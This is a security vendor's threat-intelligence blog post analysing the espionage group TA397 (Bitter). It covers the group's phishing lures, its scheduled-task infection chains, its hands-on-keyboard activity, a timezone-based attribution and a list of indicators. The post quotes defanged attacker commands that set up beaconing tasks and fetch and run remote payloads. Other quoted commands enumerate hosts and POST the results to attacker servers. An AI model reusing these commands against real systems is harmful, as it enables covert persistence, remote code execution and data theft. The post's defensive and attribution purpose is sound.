find anywhere else. Threat Glossary Learn about the latest security threats and techniques. Podcasts Stay informed with our renowned threat researchers. Power Series Join our virtual event series on the industry's most pressing topics. Threat Insight Blog Gain insight through actionable threat intelligence and expert analysis. Featured Proofpoint DISCARDED Tales from the threat research trenches Podcast Company Learn more about the team driving human and agent-centric security. About Proofpoint Leadership Learn about the executive team leading Proofpoint\u2019s strategy and vision. News Center Read the latest press releases, news stories and media highlights about Proofpoint. AI, Privacy and Trust Learn about how we handle data and make commitments to privacy and other regulations. ESG Learn how we apply our environmental, social, and governance principles to positively impact our community. Careers Stand out and make a difference at one of the world's leading cybersecurity companies. Ready to join a company redefining cybersecurity? Join our Team Blog Threat Insight The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One Share with your network! June 04, 2025 Nick Attfield and Konstantin Klinger in collaboration with Threatray\u2019s Abdallah Elshinbary and Jonas Wagner This is a two-part blog series, detailing research undertaken in collaboration with Threatray. Part two of this blog series can be found on their website here . Analyst note: Throughout this blog, researchers have defanged TA397-controlled indicators and modified certain technical details to protect investigation methods. Key findings Proofpoint Threat Research assesses it is highly likely that TA397 is a state-backed threat actor tasked with intelligence gathering in the interests of the Indian state. The group frequently experiments with their delivery methods to load scheduled tasks. However, the resulting scheduled tasks, PHP URL patterns, inclusion of a victim\u2019s computer name and username in the beaconing, and Let\u2019s Encrypt certificates on attacker servers provide a high confidence fingerprint of detecting the group\u2019s activity. TA397 will frequently target organizations and entities in Europe that have interests or a presence in China, Pakistan, and other neighboring countries on the Indian subcontinent. TA397\u2019s hands-on-keyboard and infrastructure operations align with the standard working hours of the Indian Standard Time (IST) timezone. Overview TA397 (Bitter) is an espionage group with a long history of targeting South Asian entities. While the group is frequently attributed to India (non-publicly), the reasoning behind this is not clearly documented. In this blog we share evidence showing TA397 to be an India-aligned threat actor and release previously undisclosed evidence of the group\u2019s targeting outside of Asia. In part one of this blog series, we explore TA397\u2019s campaigns, targeting, and payload delivery and conduct an in-depth analysis of TA397\u2019s infrastructure. Part two of this blog series expands on this research with a deep dive into TA397\u2019s entire observed malware arsenal, highlighting how the group\u2019s capabilities support its espionage operations. Our joint research with the Threatray research team aims to substantiate the claim that TA397 is an espionage-focused, state-backed threat actor, tasked with intelligence gathering in the interests of the Indian state. TA397\u2019s Operations This section covers some of the campaigns observed by Proofpoint Threat Research from October 2024 to April 2025 that we have attributed to TA397. Campaigns referenced throughout part one of this blog fall within this timeframe. This section covers the group\u2019s targeting, the types of email accounts used to deliver phishing emails, the subjects employed to blend with legitimate traffic, the lures crafted to entice targets to engage with attachments or links, and finally TA397\u2019s infection chains that used to deploy malicious payloads on targets of interest. Proofpoint Threat Research also has unique insight into what hands-on-keyboard activity looks like from the group. The data presented in this blog provides a new lens from which to analyze victimology and highlights the fact that the group has a much wider pool of collection targets than previously documented. Campaigns, victimology, and lures Tracking and analyzing TA397\u2019s activity over an extended period surfaces several observable behavioral patterns displayed by the group. These patterns provide threat researchers with many opportunities to monitor and detect TA397\u2019s activity. Proofpoint has observed TA397 frequently targeting an exceedingly small subset of targets. Geographically, this targeting is also almost exclusively observed against European entities with links to China or India\u2019s neighbors, with some targeting also observed in China and South America. While this is likely more indicative of visibility bias, most public reporting on the group details TA397\u2019s activities against organizations in Asia. The TA397 targeting verticals we have observed are also highly characteristic of espionage-focused threat actors. Governments, diplomatic entities, and defense organizations are frequently targeted to enable intelligence collection on foreign policy or current affairs, in addition to providing threat actors potential insight into a government\u2019s position or decision-making process on political issues, trade negotiations, defense contracts, or wider economic investments. When analyzing targeting and attributing clusters of threat activity, the topics and themes will almost certainly map onto the geopolitical, economic, or military interests of the threat actor\u2019s suspected country of origin. The targets, subjects, and lures of TA397\u2019s campaigns exhibit these same qualities, which are consistent with activity that is in the intelligence interests of the Indian state. TA397 uses a swathe of different email accounts to carry out its operations. The group has shifted between freemail providers \u2013 163[.]com, 126[.]com, and ProtonMail \u2013 and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar. Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few. The subject lines employed alongside TA397\u2019s sender accounts provide insight into topics, themes, and events specific to either the group\u2019s or the targets\u2019 interests. Some of the subjects that Proofpoint has observed in TA397\u2019s campaigns are shown below: AUTHORIZATION TO RENEW CONTRACTS OF ECD AGENTS AT THE LEVEL OF EXTERNAL REPRESENTATIONS PUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR SituationNote : SouthKorea_Martial law Seoul Embassy Advisory Invitation Embassy of the Islamic Republic of Pakistan Beijing Dec 2024. EU Delegation Key National Defense R&D Projects Note from Embassy of Mauritius 13 December 2024 Fw:Fw:CN_5896_File_vers1 Fw: A/c Records : Beijing Fw: Preferential Visa Rules Updates 2025 Protocol Guidelines for Diplomatic Missions Department of Northeast Asia, Ministry of Foreign Affairs Invitation Armed Forces Day Re: Intermediate structure WA's Ministry of Commerce File Espionage-focused threat actors frequently operate in the realm of politics, diplomacy, trade, investment, and defense. Based on Proofpoint\u2019s visibility of the group\u2019s activity, TA397 is no different. As shown above, there are some subjects purportedly discussing matters relevant to European organizations involved in diplomacy. There are also many subject lines pertaining to diplomatic or military issues in China, Pakistan, and Northeast Asia. One campaign aligned with the timing of the crisis in December 2024 when South Korea\u2019s president instituted martial law where the subject \u2013 \u201cSituationNote : SouthKorea_Martial law Seoul Embassy Advisory\u201d \u2013 clearly demonstrates how threat actors attempt to blend in with legitimate email traffic by leveraging topical themes and content the target is likely to read or see in their inbox. There are two campaigns that are particularly interesting given TA397\u2019s suspected attribution. The campaigns with the subjects \u201cPUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR\u201d and \u201cNote from Embassy of Mauritius 13 December 2024\u201d both show TA397 attempting to appear as if the emails were legitimately from the Malagasy and Mauritian embassies respectively (despite using a Chinese freemail address in the campaign where the sender claimed to be the Mauritian embassy in China). Example TA397 lure email containing a RAR-enclosed CHM attachment. This targeting may reflect that both Madagascar and Mauritius are strategic partners of India, with relationships spanning across trade, energy, infrastructure, and more. Furthermore, as of early 2024 into 2025, India has engaged in \u201cjoint naval exercises, coordinated patrols, information sharing, HADR efforts, capacity building and other diplomatic engagements\u201d with both Madagascar and Mauritius on multiple occasions . Based on the content and the decoy documents employed, it is clear that TA397 has no qualms with masquerading as other countries\u2019 governments, including Indian allies. While TA397\u2019s targets in these campaigns were Turkish and Chinese entities with a presence in Europe, it signals that the group likely has knowledge and visibility into the legitimate affairs of Madagascar and Mauritius and uses the material in spearphishing operations. Many espionage-focused threat actors often send decoy documents or accompanying files alongside initial access payloads, or links to mislead targets and convince them of the legitimacy of the email. Over the last year however, Proofpoint has only observed TA397 doing this in two instances, in a previously published campaign targeting an organization in the Turkish defense sector, and a campaign targeting European entities located in China. False document lure to add legitimacy to phishing email containing a malicious attachment. The rest of the campaigns TA397 has carried out simply contained plain-text body messages where the group masqueraded as a legitimate government organization, with an accompanying malicious attachment or URL. This choice demonstrates an overall lack of maturity in the group\u2019s phishing operations compared to many other state-backed threat actors. Infection chain TA397 may not display advanced capabilities, but the group is highly active, carrying out frequent and consistent campaigns. While the group has a \u201ctried and true\u201d methodology that it always seem to fall back on, TA397 has also demonstrated an ability to experiment with novel infection chains to bypass detections or exploit vulnerabilities. Initial access Spearphishing emails remain TA397\u2019s preferred technique for initial access, and to date, we are not aware of any reports indicating the use of alternative methods by this group. That said, the group\u2019s spearphishing tactics have evolved and demonstrate a degree of flexibility. While in 2019/2020, TA397 relied on exploiting CVEs , used ArtraDownloader to deploy additional payloads, and even experimented with Android malware , the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint , Ahnlab , StrikeReady Labs , Cisco Talos , and others. In historical operations, ArtraDownloader encoded both the username and the computer name of the infected machine within the HTTP(S) POST C2 beacon . This data was sent to the C2 server on a regular basis, presumably allowing the actor to manually assess whether the victim met certain targeting criteria, and if so, deliver a second-stage payload. TA397 continues to follow the same approach today using scheduled tasks (detailed below). The emails in the campaigns we observed typically contained either a direct attachment or a URL that leveraged a legitimate file-sharing service to deliver a file, which then launched a scheduled task. Even when a file was directly attached to the email, it ultimately resulted in the creation of a scheduled task. In some cases, the file was packaged within an archive before execution as the actors experimented with more advanced techniques. For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems , Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files , which allow users to connect with data stored in web services or remote storage locations. This was a new tactic for the group to drop and launch LNK files to the infected machine and create scheduled tasks. We cover this chain in more detail below, including the follow-on hands-on-keyboard activity. These search connectors are Microsoft XML files and are abused in a similar way to library files or saved search files. Abusing WebDAV for payload downloads has become a trend with various groups in the threat landscape over the past years. This specific search connecter technique was reported to be a security risk in 2023 , but first observed use by TA397 was in late 2024. Another esoteric file type was observed in a TA397 campaign in late 2024. The emails contained a RAR archive with an MSC file inside. If double clicked and run by the user, the MSC started mmc.exe, which set up a scheduled task that attempts to use PowerShell to download and run the next stage payload. In this campaign, TA397 exploited CVE-2024-43572, otherwise known as GrimResource , which is a vulnerability that provides attackers remote code execution in the context of mmc.exe on targeted endpoints. This vulnerability was first publicly reported in June 2024, and Threat Research first observed TA397 using this file type in October 2024. Over a period of years, TA397 has experimented with various methods for dropping or creating a scheduled task. However, the scheduled task itself remains largely unchanged, which we will highlight in the next section. Among the file types used to initiate scheduled tasks via cmd.exe or PowerShell are MSC, LNK, CHM, MS Access, IQY files, and others. Since Proofpoint began tracking TA397 in 2021, we have not observed the group using zero-day vulnerabilities or techniques that haven\u2019t already been publicly disclosed or reported. The group likely also monitors the threat landscape and follows a \u201ctried and true\u201d approach with initial access payloads, using whatever proves effective. The group maintains consistency in the scheduled task method but tends to vary when it comes to the final payload (see later chapters). The graphic below provides a general overview of the initial access infection chains observed: Overview of TA397\u2019s infection chains. Scheduled tasks The following example of a scheduled task command line shows how the task beaconed every 16 minutes to the staging domain woodstocktutors[.]com, awaiting instructions to retrieve the next-stage payload. When these samples were executed in a sandbox environment, no additional payloads were delivered. However, when allowed to run for a longer period, a next-stage payload was eventually dropped. This behavior appeared to be manual, likely triggered by the actor after evaluating certain selection criteria \u2013 such as the victim\u2019s IP address, computer name, and username, which were sent to the server via the beacon. \"C:\\\\Windows\\\\System32\\\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"EdgeTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm \"woodstocktutors[.]com/jbc.php? fv=$env:COMPUTERNAME*$env:USERNAME\" -OutFile \"C:\\\\Users\\\\public\\\\kwe.cc\"; Get-Content \"C:\\\\Users\\\\public\\\\kwe.cc\" | cmd\" The group experimented with various PowerShell and command-line tools (e.g. curl, conhost, etc.) and obfuscation methods, but the core functionality remained consistent. Below is another example featuring an obfuscated PowerShell command that created a scheduled task beaconing every 18 minutes to princecleanit[.]com: schtasks /create /tn \\\\\"Task-S-1-5-42121\\\\\" /f /sc minute /mo 18 /tr \\\\\"conhost --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m& c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d\\\\\" As part of our ongoing tracking of the group, Proofpoint Threat Research identified a signature for TA397 when creating scheduled tasks. The way the group structured PHP URI requests to staging infrastructure with a combination of computer name and username, with varying characters between, may have been an effort to throw off static detections. This has been consistent for years, as shown by the examples below observed in historical TA397 campaigns. blucollinsoutien[.]com/jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME hxxp://46.229.55[.]63/svch.php?li=%computername%..%username% hxxp://95.169.180[.]122/vbgf.php?mo=%computername%--%username% hxxp://inizdesignstudio[.]com/lk.php?xm=$env:computername*$env:username hxxp://trkswqsservice[.]com/turf.php?xm=$env:COMPUTERNAME*$env:USERNAME hxxp://woodstocktutors[.]com/jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME hxxps://princecleanit[.]com/dprin.php?dr=%computername%;%username% hxxps://utizviewstation[.]com/dows.php?cb=$env:COMPUTERNAME*$env:USERNAME hxxps://www[.]headntale[.]com/lchr.php?ach=%computername:~0,15%_%username:~0,5% hxxps://www.mnemautoregsvc[.]com/GIZMO/flkr.php?sa=COMPUTERNAME**USERNAME jacknwoods[.]com/jacds.php?jin=%computername%_%username% utizviewstation[.]com/sdf.php?fv=$env:COMPUTERNAME*$env:USERNAME warsanservices[.]com/mydown.php?dnc=%username%_%computername% warsanservices[.]com/myupload.php?dnc=%username%_%computername% Inspection of the TLS certificates used by these staging domains revealed that most of them relied on standard Let\u2019s Encrypt certificates. We performed a timestamp analysis on these certificates, as detailed in the infrastructure analysis section. Here is an example for the princecleanit[.]com staging domain: princecleanit[.]com TLS certificate from Censys . Typical characteristics: Subject DN: CN=*.<domain> Issuer DN: C=US, O=Let\u2019s Encrypt, CN=R[0-9]+ Validity Period: 90 days These present detection opportunities for the initial access techniques of this actor: the consistent use of scheduled tasks, the specific PHP URL pattern, the inclusion of the victim\u2019s computer name and username in the beacon, and the presence of a Let\u2019s Encrypt certificate on the server side. Collectively these form a high confidence fingerprint and strongly suggest the activity is attributable to TA397. Fingerprint of TA397\u2019s scheduled tasks and infrastructure. Hands-on-keyboard activity During our research, we observed TA397 engaging in hands-on-keyboard activity. Specifically, the group dropped a RAT, followed shortly by a second one. It is highly likely this was direct manual activity by the actor during a traditional work schedule in India. As covered in Proofpoint\u2019s previous blog on TA397, where we detailed the manual deployment of wmRAT and MiyaRAT, we have since observed TA397 engaging in hands-on-keyboard activity in two distinct campaigns targeting government organizations. The first case was the previously highlighted campaign using the search connecter file format, in which the group used this novel technique to drop an LNK file that would load a scheduled task on a target machine. \"C:\\\\Windows\\\\System32\\\\cmd.exe\" /start min /c schtasks /create /tn \"OneDrive\\\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379\" /f /sc minute /mo 19 /tr \"conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!& set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%hostname%c^m^d\"& msg * \"ERROR 0XA008CE : ERROR reading File, contents are corrupted.\" This LNK file used cmd.exe to set up a scheduled task named \u201cOneDrive\\\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379,\" which attempted to use conhost.exe to download and run the next stage payload every 19 minutes. To do so, the scheduled task created a curl request to hxxp://46.229.55[.]63/svch[.]php?li=%computername%..%username% providing details of the affected target machine. It also displayed a decoy error message to the user saying that the original file cannot be viewed. This scheduled task was left beaconing for 18 hours until Proofpoint first observed a response from TA397 at 05:27 UTC (10:57 IST): HTTP/1.1 200 OK Date: Thu, 05 Dec 2024 05:27:59 GMT Server: Apache/2.4.62 (Ubuntu) Content-Length: 330 Content-Type: image/jpeg Cache-Control: no-cache cd C:\\\\programdata dir > abc1.pdf tasklist >> abc1.pdf wmic /namespace:\\\\\\\\root\\\\SecurityCenter2 path AntiVirusProduct get >>abc1.pdf wmic logicaldisk get caption >> abc1.pdf systeminfo >> C:\\\\programdata\\\\abc1.pdf curl -X POST -F \"file=@C:\\\\programdata\\\\abc1.pdf\" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf This enumeration was essentially identical to the one that Proofpoint detailed in our previous blogpost on TA397 , with the addition of the systeminfo command. In the request, the actor issued a POST request with this target machine information to a different PHP endpoint on the staging domain: /svupfl[.]php?oi=%computername%_%username%. Eighteen minutes later, we observed this request: HTTP/1.1 200 OK Date: Thu, 05 Dec 2024 05:46:59 GMT Server: Apache/2.4.62 (Ubuntu) Content-Length: 381 Content-Type: image/jpeg Cache-Control: no-cache cd C:\\\\programdata set /P =\"MZ\" < nul >> sh1.txt\" curl -o sh2.txt <hxxp://173.254.204[.]72/sh2.txt> copy /b sh1.txt+sh2.txt shh.exe curl -o dune64.log <http://173.254.204[.]72/dune64.log> ren dune64.log dune64.bin shh.exe dune64.bin dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\\\programdata\\\\abc1.pdf\" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from: hxxp://173.254.204[.]72/dune64.log However, this request returned a 404 error as the attackers had not placed a file with that name on their server \u2013 making the rename command and the execution of shh.exe fail. Instead, it turned out that the next stage was present under /dune64.bin. When Proofpoint analysts executed the shh.exe payload alongside the dune64.bin binary, the full chain executed correctly. Analysis of these payloads allowed us to identify shh.exe as KugelBlitz and dune64.bin as the Demon agent from the Havoc C2 framework. This variant was found to be communicating with 72.18.215[.]108 over port 443. After the actor\u2019s initial attempt to load the backdoor failed, we observed another request at 08:57 UTC (14:27 IST): HTTP/1.1 200 OK Date: Thu, 05 Dec 2024 08:57:00 GMT Server: Apache/2.4.62 (Ubuntu) Content-Length: 263 Content-Type: image/jpeg Cache-Control: no-cache cd C:\\\\programdata net use Z: \\\\\\\\72.18.215[.]1\\\\tempy Z: Z:\\\\shl.exe dune64.bin C: net use /delete Z: /y whoami dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\\\programdata\\\\abc1.pdf\" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf In this case, TA397 attempted to execute the same chain as three hours prior, this time opting to pull the full payloads from a separate actor-controlled server, by mounting an SMB share called tempy. By enumerating this share, Proofpoint was able to identify that TA397 was also storing wmRAT and MiyaRAT payloads on the drive, the exact same binaries we blogged about in December 2024 . Furthermore, within TA397\u2019s drive, Proofpoint found two documents that may have been exfiltrated from victims. The first document was a scanned copy of an official government tax document from Bangladesh. We have redacted this information from the blog for anonymity and safety purposes. The second, was a strategic military document and appeared to originate from a military organization of Bangladesh. For these reasons, we have elected to omit it from this publication. These documents both appeared to be photocopies or scans of handwritten documents. Both documents are likely legitimate, and it is highly likely they were exfiltrated from TA397 victims. This targeting is consistent with TA397\u2019s historical activity and reinforces that both organizations are regular collection targets for TA397\u2019s espionage activities. The second case of hands-on-keyboard activity Proofpoint observed was in a more common infection chain for the group using CHM files. The email appeared to be a thread with another recipient to make the attachment appear more legitimate. The email contained a RAR compressed CHM file. If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility. \"C:\\\\Windows\\\\System32\\\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"MSTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm \"utizviewstation[.]com/sdf.php? fv=$env:COMPUTERNAME*$env:USERNAME\" -OutFile \"C:\\\\Users\\\\public\\\\documents\\\\vfc.cc\"; Get-Content \"C:\\\\Users\\\\public\\\\documents\\\\vfc.cc\" | cmd\" Proofpoint observed TA397 operators respond to these ongoing scheduled task requests with manual commands at 10:40 UTC (16:20 IST), issuing a command that enumerated the target machine and sent a POST request containing that information. tree \"%userprofile%\\\\Desktop\" /f > C:\\\\Users\\\\Public\\\\Documents\\\\d.log systeminfo >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log WMIC /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /Format:List >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log wmic logicaldisk get name >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log cd C:\\\\Users\\\\Public\\\\Documents curl -X POST -F \"file=@d.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%computername% del d.log Similar to previously observed hands-on-keyboard activity seen from the group, the POST request containing the infected machine\u2019s information was directed to the same staging domain, but a different PHP URI /urf.php?mn=%computername% than the scheduled task. Proofpoint has observed TA397 refraining from dropping next-stage payloads depending on the system information provided on the infected machine. It is likely that the computer name and information sent to the staging domain within the scheduled tasks undergo some form of pre-filtering. This selection criterion is similar to what was reported regarding the earlier use of ArtraDownloader . This is also likely why the actors remained consistent in their use of scheduled tasks, while varying their initial access methods and final payloads. Their selection criteria is a crucial part of their overall process and indicative of the highly targeted nature of espionage. At 13:37 UTC (19:07 IST) we observed this response from the attacker server: curl -o C:\\\\ProgramData\\\\msuitl.tar hxxp://utizviewstation[.]com/msuitl.tar cd C:\\\\ProgramData tar -xvf msuitl.tar dir > t0.log msuitl.exe tasklist >> t0.log curl -X POST -F \"file=@t0.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%username% del t0.log This issued a request to the /msuitl.tar endpoint on the domain, dropping the final payload: HTTP/1.1 200 OK Connection: Keep-Alive Keep-Alive: timeout=5, max=100 content-type: application/x-tar last-modified: Mon, 03 Feb 2025 11:23:10 GMT accept-ranges: bytes content-length: 45568 date: Mon, 03 Feb 2025 13:37:21 GMT server: LiteSpeed Cache-Control: no-cache msuitl.exe As seen from the response headers, the endpoint was modified 43 minutes after the initial enumeration of the infected machine, suggesting TA397 made a conscious decision to load a hand-picked payload to the staging infrastructure. It is likely this payload selection is directly correlated to target selection and information gleaned from initial enumeration.The final payload of this campaign turned out to be BDarkRAT, which can be found in part two of this post on Threatray\u2019s blog . While TA397\u2019s initial access vector has consistently been spearphishing emails and the first part(s) of the group\u2019s intrusion chains have varied between a handful of techniques, the breadth of malware payloads the group has been observed deploying is significant. The following image plots the timestamps of our observed hands-on-keyboards activity over a Monday to Friday working hours schedule in Indian Standard Timezone (IST): Heatmap of observed hands-on-keyboard activity timestamps. Infrastructure analysis Timezone analysis has proven to be a successful method for attributing espionage groups \u2014not only for Asian espionage groups , but also specifically for TA397, as demonstrated by Bitdefender in 2020 , and during our observations of hands-on-keyboard activity. In the Bitdefender research, analysis of the creation timestamps of code-signing certificates used in TA397 malware, as well as ZIP file timestamps for samples, revealed that they mapped to Indian Standard Time (UTC +5:30) and followed a 9-to-5, Monday-to-Friday working schedule. For this research, we collected 122 known TA397 C2 and staging domains from internal telemetry, pivoting, and public reports, spanning several years since the group was first publicly reported. For each domain (when available), we gathered the following three timestamps: and public reports, spanning several years since the group was first publicly reported. For each domain (when available), we gathered the following three timestamps: Passive DNS first seen timestamp; Domain creation timestamp from WHOIS data; TLS certificate creation timestamp from Let\u2019s Encrypt certificate. Example data: Domain Campaign Date Passive DNS WHOIS Certificate Staging URL blucollinsoutien[.]com 2025-04-01 2025-03-11 13:09:43 IST 2025-03-11 13:06:44 IST 2025-03-11 13:08:45 IST /jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME princecleanit[.]com 2025-03-26 2025-01-03 14:16:21 IST 2025-01-02 15:27:04 IST 2025-01-02 15:30:00 IST /dprin.php?dr=COMPUTERNAME;USERNAME After converting all timestamps to Indian Standard Time (IST), we generated three separate heatmaps\u2014one for each data source. For better visualization, the standard \u201cworking hours\u201d are marked with dotted lines. The data largely aligns with this pattern or at least suggests a clear trend. Passive DNS: Heatmap of Passive DNS first seen timestamps. Since there can be a delay between domain registration and the first seen timestamp recorded in passive DNS databases for a variety of reasons, the presence of outliers is not unexpected. WHOIS: Heatmap of WHOIS domain registration timestamps. WHOIS data provides information about domain registrations. For this research, we queried the WHOIS database directly. Since we are working with historical data, the domain creation date was not always available for every domain included in the study (e.g. removed from the database following domain expiry). The data shows that \u201clunch hour\u201d on Friday stands out, as the actor registered multiple domains within minutes of each other on the same day. Logically, this suggests that a member of the infrastructure team likely registered several domains in a single \u201csession\u201d rather than just one at a time. Certificate: Heatmap of Let\u2019s Encrypt certificate valid from timestamps. For this research, we used Censys to locate the TLS certificates associated with each domain and queried the certificate creation timestamp. We only included data points where a Let\u2019s Encrypt certificate was used, as this has previously been identified as an indicator of this group\u2019s infrastructure. One of the challenges we faced was that some of the historical C2 and staging domains were no longer active \u2013 either expired or re-registered \u2013 so selecting the correct Let\u2019s Encrypt certificate was critical to ensure accurate analysis. Some registrars and providers offer services that automatically renew expired certificates or issue a TLS certificate upon domain registration. The domains analyzed in this research span a variety of hosting providers. Combining all data sources into a single heatmap yields the following result: Combined heatmap of Passive DNS, WHOIS and certificate timestamps. There is a visible variation between domain creation and TLS certificate issuance. Below are two example data points \u2013 one for a C2 domain and one for a staging domain \u2013 where the domain was registered several days before the corresponding TLS certificate was issued. The associated campaign activity began several days after that. All timestamps align with India Standard Time, and there is a clear indication that most infrastructure-related activity occurs during standard business hours in that timezone. Domain Passive DNS WHOIS Certificate Source / Campaign utizviewstation[.]com 2025-01-03 17:04:43 IST 2025-01-03 14:31:26 IST 2025-01-06 16:16:55 IST First seen in Campaign data: 2025-02-03, Staging URL: /sdf.php?fv=$env:COMPUTERNAME*$env:USERNAME ottawadesignlab[.]com 2024-08-25 16:23:26 IST 2024-08-23 12:23:49 IST 2024-09-27 12:32:13 IST Mentioned as C2 in https://www.ctfiot.com/211062.html Attribution Attribution of state-backed espionage activity has always been a challenge. However, by analyzing the confluence of multiple signals across various aspects of an actor\u2019s operations, we can make assessments as to the motives and origins of observed activity. TA397 is an espionage-focused threat actor that highly likely operates on behalf of an Indian intelligence organization. Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent. Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations. Moreover, the use of legitimate or spoofed decoy documents, subject lines, and body contents pertaining to internal or foreign government affairs demonstrates that TA397 is very familiar with the standard practices of government. Having likely legitimate internal documents issued by the Bangladeshi military and tax authorities is highly consistent with the assessment that TA397 carries out intelligence-based tasking for Indian state interests. Our observations of hands-on-keyboard activity engagements showed TA397\u2019s responses beginning at 05:27 UTC following hours of dormant scheduled task beaconing in the first observed case, with follow up activity observed at 05:46 UTC and 08:57 UTC. In the second case, activity began at 10:40 UTC. Modifications on TA397\u2019s server were observed at 11:27 UTC with final follow up payload delivery at 13:37 UTC. This aligns with public assessments that TA397 is a threat actor of South Asian origin, if adjusted to Indian Standard Time or similar timezones. However, our analysis of TA397\u2019s sprawling infrastructure demonstrates the operational patterns the group follows. There is a clear indication that most infrastructure-related activity occurs during standard business hours in the IST timezone. As covered in part two of this blog series with Threatray, there is also overlap of tooling with other known Indian threat actors, Mysterious Elephant/APT-K-47 and Confucius through the use of ORPCBackdoor. This strongly suggests that TA397 is part of a tool sharing ecosystem among Indian state-backed actors. However, more research is needed to determine whether these groups operate with access to a central \u201cquartermaster\u201d \u2013 development resources that are either internal or external to the organizations they belong to. Indicators Indicator Type Description First Seen mnemautoregsvc[.]com Domain Staging domain October 2024 jacknwoods[.]com Domain Staging domain November 2024 1b67fc55fd050d011d6712ac17315112767cac8bbe059967b70147610933b6c1 SHA256 LNK scheduled task loader December 2024 7c5dde52845ecae6c80c70af2200d34ef0e1bc6cbf3ead1197695b91acd22a67 SHA256 CHM scheduled task loader December 2024 b56385dc93cc8f317ce499539b0d52aa0b3d8b6a8f9493e1ee7ba01765edd020 SHA256 LNK scheduled task loader December 2024 hxxp://46[.]229[.]55[.]63/svch.php?li=%computername%[.][.]%username% URL Payload delivery December 2024 hxxp://95[.]169[.]180[.]122/vbgf.php?mo=%computername%--%username% URL Payload delivery December 2024 inizdesignstudio[.]com Domain Staging domain December 2024 trkswqsservice[.]com Domain Staging domain January 2025 80b3a71138c34474725bbb177d8dec078effb7d8f4b19bf2e7a881b01ec7d323 SHA256 CHM scheduled task loader January 2025 55f75724386dbe740c0b868da913af2c8b280335da4fde64e2300c776b79d4e8 SHA256 CHM scheduled task loader February 2025 cdddbd65dbb24d3b9205e417cc267007bfd0369c316f70d2749887b9f02e949b SHA256 MSC scheduled task loader Februrary 2025 utizviewstation[.]com Domain Staging domain February 2025 1fbf95ccf1193e84d0e4f8c315816dd2aec56edb11ef1e7b28667360ca7e5ccd SHA256 CHM scheduled task loader March 2025 55f75724386dbe740c0b868da913af2c8b280335da4fde64e2300c776b79d4e8 SHA256 CHM scheduled task loader March 2025 5a39f10d2e4c1cae1b52baff0cf8b3e397da2e69cb90e1bac138e8d437cbea41 SHA256 IQY scheduled task loader March 2025 blucollinsoutien[.]com Domain Staging domain March 2025 princecleanit[.]com Domain Staging domain March 2025 woodstocktutors[.]com Domain Staging domain April 2025 warsanservices[.]com Domain Staging domain April 2025 headntale[.]com Domain Staging domain April 2025 cc65fac9151fa527bc4b296f699475554ee2510572b8c16d5ef4b472a4cb9ffc SHA256 Microsoft Access Database scheduled task loader April 2025 680c99915d478ed8d9f1427b3deb2ebd255a6ec614ad643909ab4c01f52905ae SHA256 CHM scheduled task loader April 2025 c9612051b3956ac8722d8be7994634b7c940be07ca26e2fc8d0d5c94db2e4682 SHA256 CHM scheduled task loader May 2025 Previous Blog Post Next Blog Post Subscribe to the Proofpoint Blog Turn people into your best defense with Proofpoint Get in Touch Products Collaboration Security Data Security and Governance Partners Channel Partners and Distributors MSP Partners Technology and Alliance Partners Get Support Product Support Login Support Services IP Address Blocked? More About Proofpoint Why Proofpoint Careers Leadership Team News Center AI, Privacy and Trust Hornetsecurity Connect with Us +1 408 517 4710 Attend an Event Contact Us Free Demo Request \u00a9 2026. All rights reserved. Terms and conditions Privacy Policy Sitemap",
